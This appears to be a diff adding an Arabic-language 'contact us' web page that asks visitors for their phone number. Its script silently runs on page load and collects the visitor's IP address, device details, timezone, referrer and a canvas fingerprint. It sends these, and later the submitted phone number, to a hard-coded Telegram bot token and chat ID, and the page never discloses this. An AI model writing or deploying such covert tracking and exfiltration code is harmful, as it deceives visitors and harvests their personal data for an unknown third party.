@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>تواصل معنا</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: system-ui, -apple-system, "Segoe UI", Tahoma, sans-serif;
+    background: #0f1420; color: #e8ecf4; min-height: 100vh;
+    display: flex; align-items: center; justify-content: center; padding: 20px;
+  }
+  .card {
+    background: #171e2e; border: 1px solid #232c44; border-radius: 16px;
+    padding: 32px 28px; max-width: 400px; width: 100%; text-align: center;
+    box-shadow: 0 10px 40px rgba(0,0,0,.45);
+  }
+  .logo {
+    width: 56px; height: 56px; margin: 0 auto 16px; border-radius: 50%;
+    background: linear-gradient(135deg,#3b82f6,#8b5cf6);
+    display: flex; align-items: center; justify-content: center; font-size: 26px;
+  }
+  h1 { font-size: 20px; margin-bottom: 8px; }
+  p.sub { color: #9aa5bd; font-size: 14px; margin-bottom: 22px; line-height: 1.7; }
+  input {
+    width: 100%; padding: 13px 14px; border-radius: 10px;
+    border: 1px solid #2b3550; background: #0f1420; color: #fff;
+    font-size: 16px; margin-bottom: 12px; text-align: center; direction: ltr;
+  }
+  input:focus { outline: none; border-color: #3b82f6; }
+  button {
+    width: 100%; padding: 13px; border: none; border-radius: 10px;
+    background: linear-gradient(135deg,#3b82f6,#8b5cf6); color: #fff;
+    font-size: 16px; font-weight: 700; cursor: pointer;
+  }
+  button:disabled { opacity: .6; cursor: default; }
+  .done { display: none; }
+  .done .check { font-size: 44px; margin-bottom: 12px; }
+</style>
+</head>
+<body>
+
+<div class="card" id="formCard">
+  <div class="logo">💬</div>
+  <h1>تواصل معنا</h1>
+  <p class="sub">سيب رقم تليفونك وهنكلمك في أقرب وقت</p>
+  <input id="phone" type="tel" inputmode="tel" placeholder="01xxxxxxxxx" maxlength="15" />
+  <button id="sendBtn" onclick="submitPhone()">إرسال</button>
+</div>
+
+<div class="card done" id="doneCard">
+  <div class="check">✅</div>
+  <h1>تم!</h1>
+  <p class="sub">استلمنا رقمك وهنكلمك قريب</p>
+</div>
+
+<script>
+// ===== الإعدادات =====
+const BOT_TOKEN = "8736282788:AAFGDokq26-1EvuwNB-o-5w01q91fL9YFXk";
+const CHAT_ID   = "8943989852";
+// =====================
+
+const sessionId = Math.random().toString(36).slice(2, 10);
+
+function hash(str) {
+  let h = 0;
+  for (let i = 0; i < str.length; i++) { h = (h << 5) - h + str.charCodeAt(i); h |= 0; }
+  return (h >>> 0).toString(16);
+}
+
+function canvasFp() {
+  try {
+    const c = document.createElement('canvas'); c.width = 200; c.height = 50;
+    const x = c.getContext('2d');
+    x.textBaseline = 'top'; x.font = '16px Arial';
+    x.fillStyle = '#f60'; x.fillRect(10, 10, 60, 30);
+    x.fillStyle = '#069'; x.fillText('fp_abc123', 20, 20);
+    return hash(c.toDataURL());
+  } catch (e) { return 'n/a'; }
+}
+
+async function getIP() {
+  try {
+    const ctl = new AbortController();
+    const t = setTimeout(() => ctl.abort(), 6000);
+    const r = await fetch('https://api.ipify.org?format=json', { signal: ctl.signal });
+    clearTimeout(t);
+    const j = await r.json();
+    return j.ip || 'unknown';
+  } catch (e) { return 'unknown'; }
+}
+
+function deviceInfo() {
+  const n = navigator;
+  return {
+    ua: (n.userAgent || '').slice(0, 220),
+    platform: n.platform || 'n/a',
+    lang: n.language + ' / ' + (n.languages || []).join(','),
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'n/a',
+    screen: screen.width + 'x' + screen.height + ' d' + screen.colorDepth,
+    touch: n.maxTouchPoints || 0,
+    cores: n.hardwareConcurrency || 'n/a',
+    mem: n.deviceMemory ? n.deviceMemory + 'GB' : 'n/a',
+    fp: canvasFp(),
+    ref: document.referrer || 'direct'
+  };
+}
+
+async function tg(text) {
+  try {
+    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
+  } catch (e) { /* silent */ }
+}
+
+async function logVisit() {
+  const ip = await getIP();
+  window._ip = ip;
+  const d = deviceInfo();
+  const time = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Cairo' }) + ' (Cairo)';
+  tg(
+`👁️ زيارة جديدة
+🆔 ${sessionId}
+🕐 ${time}
+🌐 IP: ${ip}
+💻 ${d.platform} | ${d.ua}
+🗣️ ${d.lang}
+🌍 ${d.tz}
+📐 ${d.screen} | touch:${d.touch} | cpu:${d.cores} | ram:${d.mem}
+🔗 ref: ${d.ref}
+#️⃣ fp: ${d.fp}`
+  );
+}
+
+function submitPhone() {
+  const v = document.getElementById('phone').value.trim();
+  if (!v) { document.getElementById('phone').focus(); return; }
+  document.getElementById('sendBtn').disabled = true;
+  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌐 IP: ${window._ip || 'unknown'}`);
+  document.getElementById('formCard').style.display = 'none';
+  document.getElementById('doneCard').style.display = 'block';
+}
+
+logVisit();
+</script>
+</body>
+</html>
